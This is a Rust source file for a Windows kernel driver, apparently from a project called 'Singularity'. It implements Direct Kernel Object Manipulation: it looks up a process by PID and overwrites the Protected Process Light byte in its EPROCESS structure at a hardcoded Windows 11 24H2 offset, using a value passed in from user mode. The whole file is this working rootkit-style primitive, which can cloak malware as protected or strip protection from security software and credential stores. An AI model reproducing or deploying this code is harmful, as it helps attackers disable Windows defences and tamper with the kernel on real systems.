use wdk::{nt_success, println};
use wdk_sys::{ntddk::PsLookupProcessByProcessId, NTSTATUS, PEPROCESS};

/// WARNING: This changes between Windows versions.
/// Windows 11 24H2 (26100.1) EPROCESS->Protection offset is 0x5FA
const EPROCESS_PROTECTION_OFFSET: usize = 0x5FA;

/// Changes the protection level byte of the specified process.
///
/// This function performs Direct Kernel Object Manipulation (DKOM) by locating the `EPROCESS`
/// structure for the target process and directly modifying its protection byte to the
/// value requested by user-mode.
///
/// # Arguments
///
/// * `pid` - The Process ID of the user-mode target to modify.
/// * `level` - The raw protection byte value to apply (e.g., 0x31 for PPL-Antimalware).
///
/// # Errors
///
/// Returns an `NTSTATUS` error code if the process lookup fails, which typically occurs
/// if the PID is invalid or the target process has already terminated.
///
/// # Safety
///
/// While the function signature itself is safe to call from standard Rust code, the internal
/// logic relies on hardcoded internal Windows offsets (`EPROCESS_PROTECTION_OFFSET`).
/// Executing this on an unsupported Windows version where the offset has changed will
/// corrupt adjacent kernel memory, resulting in an immediate Bug Check (BSOD).
pub fn change_process_ppl(pid: u32, level: u8) -> Result<(), NTSTATUS> {
    let mut process: PEPROCESS = core::ptr::null_mut();

    // SAFETY: Casting the u32 PID to a HANDLE is the expected FFI pattern for NTOSKRNL.
    // We pass a valid mutable reference to receive the PEPROCESS pointer.
    let status = unsafe { PsLookupProcessByProcessId(pid as _, &mut process) };
    if !nt_success(status) {
        println!(
            "[Singularity::dkom] Failed to lookup PID {}: {:#010X}",
            pid, status
        );
        return Err(status);
    }

    let process_guard = crate::raii::EprocessGuard(process);

    // SAFETY: We hold a valid, reference-counted pointer to the EPROCESS structure.
    // Volatile reads and writes are mandatory here because this memory is actively
    // managed and accessed by the kernel concurrently.
    unsafe {
        let process_base = process_guard.0 as *mut u8;
        let protection_addr = process_base.add(EPROCESS_PROTECTION_OFFSET);

        let old_value = core::ptr::read_volatile(protection_addr);
        core::ptr::write_volatile(protection_addr, level);

        println!(
            "[Singularity::dkom] Success. PID: {} | Offset: {:#X} | Old: {:#02X} -> New: {:#02X}",
            pid, EPROCESS_PROTECTION_OFFSET, old_value, level
        );
    }

    Ok(())
}
